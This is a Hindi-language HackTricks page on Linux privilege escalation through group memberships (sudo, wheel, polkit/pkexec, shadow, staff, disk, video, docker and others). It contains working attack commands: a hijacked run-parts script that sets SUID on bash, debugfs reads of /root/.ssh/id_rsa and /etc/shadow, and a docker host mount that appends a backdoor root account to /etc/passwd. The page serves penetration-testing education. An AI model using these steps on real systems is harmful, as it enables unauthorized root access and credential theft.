# दिलचस्प Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**कभी-कभी**, किसी सिस्टम की **/etc/sudoers** policy (या उसमें शामिल की गई किसी फ़ाइल) में इस तरह की entries होती हैं:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

इसका मतलब है कि किसी भी entry से match होने वाला कोई भी user, `sudo` के ज़रिए किसी भी target user के रूप में कोई भी command चला सकता है (बाकी policy की शर्तों के अधीन)।<sup>[[3]](#references)</sup>

अगर ऐसा है, तो **root बनने के लिए बस यह चलाएँ**:

```
sudo su
```

यदि `sudo -l` केवल username के साथ सीमित `adduser` invocation की अनुमति देता है, तो जाँचें कि क्या यह ऐसा समान-नाम वाला primary group बनाता है जो अभी मौजूद नहीं है। उस group में नया account विशेषाधिकार प्राप्त कर सकता है, यदि प्रभावी sudoers policy पहले से `%group` को अनुमति देती है; इसे privilege escalation path मानने से पहले group-creation behavior और group rule, दोनों की पुष्टि करें। Account बनाने से system में बदलाव होता है, इसलिए पहले policy की जाँच करें।

### PE - Method 2

सभी suid binaries खोजें और जाँचें कि **Pkexec** binary मौजूद है या नहीं:

```bash
find / -perm -4000 2>/dev/null
```

यदि **pkexec एक SUID binary है**, तो यह किसी अन्य user के रूप में program तभी चला सकता है जब polkit अनुरोधित action को authorize करे; केवल SUID bit होने से root access की गारंटी नहीं मिलती। **sudo** या **admin** group की membership को पर्याप्त मानने के बजाय, installed policy और target session के authorization की जाँच करें।<sup>[[4]](#references)[[5]](#references)</sup>

अलग [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) path के लिए, पहले पुष्टि करें कि `pkexec` एक executable **root-owned SUID** file है। इस bit के बिना installed binary वह local SUID escalation नहीं है जिसका advisory में वर्णन किया गया है। Upstream version string केवल एक संकेत है: distributions [पुराने package versions में fix backport कर सकती हैं](https://ubuntu.com/security/CVE-2021-4034), इसलिए इसे vulnerable कहने से पहले installed vendor package और mitigations की जाँच करें।

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) polkit का एक अलग path है: D-Bus authorization race, `pkexec` SUID flaw नहीं। Installed vendor polkit package की समीक्षा करें और जाँचें कि क्या कोई reachable privileged D-Bus action उपयोगी बदलाव कर सकता है; account-creation route के लिए AccountsService जैसी उपयुक्त service भी चाहिए, और किसी नए group की sudo access प्रभावी sudo policy पर निर्भर करती है। Reported polkit version या installed service मात्र एक संभावित संकेत है, खासकर वहाँ जहाँ vendors [fixes backport करते हैं](https://access.redhat.com/security/cve/cve-2021-3560)। Passive enumeration से race trigger नहीं होनी चाहिए।

जिन distributions में अब भी पुराने Local Authority backend का उपयोग होता है, वहाँ इसके group rules इस command से देखें:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

प्रासंगिक group नाम और डिफ़ॉल्ट distribution के अनुसार अलग-अलग होते हैं; यहाँ कोई group तभी उपयोगी है, जब local policy में उसका नाम हो।<sup>[[5]](#references)</sup>

**root बनने के लिए आप यह execute कर सकते हैं**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

यदि आप **pkexec** चलाने की कोशिश करते हैं और आपको यह **error** मिलता है:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

बिना registered authentication agent वाले SSH session में, `pkexec` इस error के साथ विफल हो सकता है, भले ही policy अन्यथा इस कार्रवाई की अनुमति देती हो; polkit, non-desktop sessions के लिए text authentication agent के रूप में `pkttyagent` का दस्तावेज़ देता है। सटीक व्यवहार version और distribution पर निर्भर करता है, इसलिए स्थानीय policy और agent setup की पुष्टि करें। प्रभावित NixOS versions के लिए एक रिपोर्ट किया गया workaround **2 अलग-अलग SSH sessions** का उपयोग करता है।<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

ऐसा ACL जो किसी एक account को `su` का access देने से रोकता है, उस executable को नियंत्रित करता है—administrator-authorized कार्रवाई तक पहुँचने के हर रास्ते को नहीं। यदि administrator credential स्वतंत्र रूप से उजागर हुआ है, तो जाँचें कि क्या effective polkit policy के तहत `systemd-run` के माध्यम से transient system service शुरू करने जैसी अलग कार्रवाई की अनुमति है, authentication agent किस identity को स्वीकार करता है, और परिणामी service किस identity का उपयोग करेगी। [Polkit, session owner के रूप में authentication और administrator के रूप में authentication में अंतर करता है](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), जबकि [systemd-run, system manager से transient service का अनुरोध कर सकता है](https://systemd.io/CONTROL_GROUP_INTERFACE/)। केवल history entry, installed command या readable policy file से authorization या credential की validity साबित नहीं होती; passive review के दौरान credentials न दें और unit शुरू न करें।

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel Group

कभी-कभी sudoers policy में यह entry भी हो सकती है:

```
%wheel	ALL=(ALL:ALL) ALL
```

इसका अर्थ है कि इस entry से मेल खाने वाला कोई भी user, policy की बाकी शर्तों के अधीन, `sudo` के ज़रिए किसी भी target user के रूप में कोई भी command चला सकता है।<sup>[[3]](#references)</sup>

अगर ऐसा है, तो **root बनने के लिए आप बस यह execute कर सकते हैं**:

```
sudo su
```

## Shadow Group

जिन सिस्टमों पर permissions इसकी अनुमति देती हैं, वहाँ **shadow** group के users **/etc/shadow** को **read** कर सकते हैं; target पर वास्तविक mode और ACLs की पुष्टि करें:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

तो, फ़ाइल पढ़ें और कुछ hashes **crack** करने की कोशिश करें।

Hashes की जाँच करते समय lock state से जुड़ी एक अहम बात:
- `!` या `*` वाली entries आम तौर पर password login के लिए non-interactive होती हैं।
- `!hash` का मतलब है कि password lock कर दिया गया था; बाकी characters उस password field को दर्शाते हैं जो lock किए जाने से पहले मौजूद था।
- `*` वाली field मान्य `crypt(3)` hash नहीं होती और UNIX-password login को रोकती है; इससे यह निष्कर्ष न निकालें कि पहले password सेट किया गया था या नहीं।
Direct login blocked होने पर भी यह account classification में उपयोगी है।<sup>[[6]](#references)</sup>

## स्टाफ समूह

**staff**: Users को root privileges की ज़रूरत के बिना system (`/usr/local`) में local modifications जोड़ने की अनुमति देता है (ध्यान दें कि `/usr/local/bin` में मौजूद executables किसी भी user के PATH variable में होते हैं, और समान नाम वाले `/bin` तथा `/usr/bin` के executables को "override" कर सकते हैं)। इसकी तुलना "adm" समूह से करें, जो monitoring/security से अधिक संबंधित है।<sup>[[2]](#references)[[7]](#references)</sup>

उन Debian configurations में जहाँ `/usr/local/bin`, `PATH` में `/usr/bin` से पहले आता है (जैसा कि नीचे दिए गए उदाहरणों में है), बिना पूरी path के दिया गया command पहले `/usr/local/bin` वाली copy को resolve करता है; target पर प्रभावी `PATH` की पुष्टि करें।

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

यदि कोई privileged process किसी unqualified command को खोजने के लिए writable `/usr/local/bin` का उपयोग करता है, तो उस command को बदलने से वह process के privileges के साथ चल सकता है; परीक्षण से पहले वास्तविक path और trigger की पुष्टि करें।

Ubuntu systems पर, login के समय `pam_motd` root के रूप में `run-parts --lsbsysinit` के ज़रिए executable scripts चलाता है; cron jobs भी `run-parts` का उपयोग कर सकती हैं, लेकिन यह distribution और configuration पर निर्भर करता है।<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

नए SSH login पर, `pspy` यह पुष्टि करने में मदद कर सकता है कि target पर यह path वास्तव में invoke होता है या नहीं; यह root के बिना process command lines देख सकता है।<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk Group

**disk** group की सदस्यता से block devices का raw access मिल सकता है और यह अक्सर **root access के लगभग बराबर** होता है; Debian इसे ज्यादातर root के बराबर बताता है, लेकिन target पर वास्तविक device permissions और storage layout की जाँच करें।<sup>[[7]](#references)</sup>

आम device paths में `/dev/sd*` शामिल हैं, लेकिन NVMe और अन्य storage layouts में अलग नाम इस्तेमाल होते हैं।

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs`, ext2/ext3/ext4 फ़ाइलसिस्टम पर काम करता है; ऊपर दिए गए `/root` और `/etc/shadow` जैसे पथ खोले गए फ़ाइलसिस्टम के भीतर की फ़ाइलें हैं, जबकि `dump` का दूसरा argument मूल फ़ाइलसिस्टम का output path होता है।<sup>[[8]](#references)</sup> उदाहरण के लिए, यह खोले गए फ़ाइलसिस्टम से `/tmp/asd1.txt` निकालकर मूल फ़ाइलसिस्टम पर `/tmp/asd2.txt` में रखता है:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

`-w` विकल्प filesystem को read-write मोड में खोलता है, और `write` command एक native file को खुले हुए filesystem में कॉपी करता है। इसे mounted live filesystem पर इस्तेमाल न करें, क्योंकि सीधे बदलाव करने से filesystem corrupt हो सकता है; संभव हो तो offline image पर काम करें।<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video Group

`w` कमांड का उपयोग करके आप पता लगा सकते हैं कि **सिस्टम पर कौन लॉग इन है**, और इसका आउटपुट कुछ इस तरह दिखेगा।<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

**tty1** प्रविष्टि पहले Linux वर्चुअल कंसोल की पहचान करती है; यह अपने आप में साबित नहीं करती कि कोई उपयोगकर्ता मशीन पर भौतिक रूप से मौजूद है, खासकर containers या अन्य वातावरणों में।<sup>[[21]](#references)</sup>

जिन सिस्टमों में पढ़ने योग्य framebuffer डिवाइस उपलब्ध है, वहाँ **video** समूह की सदस्यता उस डिवाइस तक पहुँच दे सकती है। Linux framebuffer interface `/dev/fb0` को ऐसे पढ़ने योग्य memory device के रूप में दस्तावेज़ित करता है जिसकी कॉपी लेकर स्क्रीन का snapshot बनाया जा सकता है; `/sys/class/graphics/fb0/virtual_size` path केवल वहीं उपलब्ध होता है जहाँ वह fbdev sysfs attribute मौजूद हो, इसलिए पहले target की जाँच करें।<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

यदि इंस्टॉल किए गए **GIMP** संस्करण में raw-data importer उपलब्ध है, तो **`screen.raw`** को उससे खोलें; सपोर्ट और कंट्रोल्स संस्करण तथा plug-in के अनुसार अलग-अलग हो सकते हैं।<sup>[[22]](#references)</sup>

![डिस्क ग्रुप - वीडियो ग्रुप: Raw image खोलने के लिए GIMP का उपयोग करें, screen.raw फ़ाइल चुनें और फ़ाइल टाइप के रूप में Raw image data चुनें](<../../../images/image (463).png>)

इमेज की Width और Height को framebuffer geometry के अनुसार सेट करें; जब तक आउटपुट पढ़ने योग्य न हो जाए, उपलब्ध pixel formats/Image Types आज़माएँ।<sup>[[9]](#references)</sup>

![डिस्क ग्रुप - वीडियो ग्रुप: फिर Width और Height को स्क्रीन पर उपयोग किए गए मानों के अनुसार बदलें और अलग-अलग Image Types जाँचें (और स्क्रीन को सबसे बेहतर दिखाने वाला चुनें)](<../../../images/image (317).png>)

## रूट ग्रुप

**root** ग्रुप की सदस्यता से root का UID नहीं मिलता, लेकिन `root` के स्वामित्व वाली और ग्रुप द्वारा लिखी जा सकने वाली फ़ाइलें तब भी दिलचस्प हो सकती हैं, जब privileged services या libraries उनका उपयोग करती हों। किसी फ़ाइल को privilege-escalation path मानने से पहले उसकी वास्तविक permissions और उपयोग की पुष्टि करें।

**जाँचें कि root ग्रुप के सदस्य किन फ़ाइलों में बदलाव कर सकते हैं**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

मानक rootful installs में `docker` group की सदस्यता Docker daemon तक root-level access देती है। क्योंकि bind mounts डिफ़ॉल्ट रूप से read-write होते हैं, इस daemon को नियंत्रित कर सकने वाला उपयोगकर्ता host के `/` को container में mount करके host की फ़ाइलें बदल सकता है; इससे प्रभावी रूप से host पर root access मिल जाता है।<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

`/etc/group`, `/etc/gshadow` और मौजूदा process token में group membership का डेटा अलग-अलग हो सकता है। अगर `id -nG` में उपयोगकर्ता का नाम नहीं है, लेकिन `newgrp docker` सफल होता है, तो नए shell में `id` से दिखने वाला group जाँचें और यह परखें कि Docker socket वास्तव में writable है और rootful daemon चला रहा है। केवल group का नाम host पर नियंत्रण स्थापित नहीं करता। किसी भी automated `newgrp` probe की समय-सीमा तय करें, ताकि password prompt enumeration को रोक न सके।

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

अंत में, अगर आपको पहले दिए गए सुझाव पसंद नहीं आए, या वे किसी वजह से काम नहीं कर रहे (docker api firewall?), तो आप हमेशा **एक privileged container चलाकर उससे escape करने की कोशिश कर सकते हैं**, जैसा कि यहाँ बताया गया है:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

अगर आपके पास docker socket पर write permissions हैं, तो [**docker socket का दुरुपयोग करके privileges escalate करने के बारे में यह पोस्ट पढ़ें**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**।**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm Group

आमतौर पर **`adm`** group के **members** को _/var/log/_ के अंदर मौजूद log files **पढ़ने** की permissions होती हैं।\
इसलिए, अगर आपने इस group के किसी user को compromise किया है, तो आपको निश्चित रूप से **logs पर नज़र डालनी चाहिए**।<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

इन groups के अर्थ service और distribution के अनुसार अलग-अलग होते हैं। Debian, delegated backup/restore के लिए `backup`, printer daemons के लिए `lp`, और `/var/mail` के लिए `mail` को दस्तावेज़ित करता है। इसलिए membership को privilege path मानने से पहले स्थानीय permissions जाँचें।<sup>[[7]](#references)</sup>

अक्सर ये सीधे root तक पहुँचने के बजाय **credentials खोजने** के vectors होते हैं:
- **backup**: ऐसे archives तक पहुँच दे सकता है जिनमें configs, keys, DB dumps या tokens हों।
- **operator**: platform के अनुसार operational access, जिससे संवेदनशील runtime data leak हो सकता है।
- **lp**: print queues/spools में दस्तावेज़ों की सामग्री हो सकती है।
- **mail**: mail spools में reset links, OTPs और आंतरिक credentials हो सकते हैं।

यहाँ membership को उच्च-मूल्य वाले data exposure finding के रूप में लें और password/token reuse के ज़रिए आगे बढ़ें।

## Auth group

OpenBSD पर, जब S/Key configured हो, तो `/etc/skey` का owner `root:auth` होता है और इसके records तक पहुँचने के लिए `auth` group आवश्यक है; YubiKey records `/var/db/yubikey` में रखे जाते हैं।<sup>[[16]](#references)[[17]](#references)</sup> S/Key या YubiKey enabled होने पर OpenBSD 6.6 का एक vulnerable configuration, `auth` privileges वाले local users को root बनने देता था; Qualys इसकी prerequisite और exploit chain का दस्तावेज़ देता है, और linked PoC इसे लागू करता है।<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [GUI session के बिना pkexec/pkttyagent authentication (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Securing Debian Manual](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Frame Buffer Device — The Linux Kernel documentation](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine security](https://docs.docker.com/engine/security/)
- [14] [Manage Docker as a non-root user](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Running containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSD में authentication vulnerabilities — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux allocated devices (4.x+ version)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Image Import and Export — GIMP Documentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
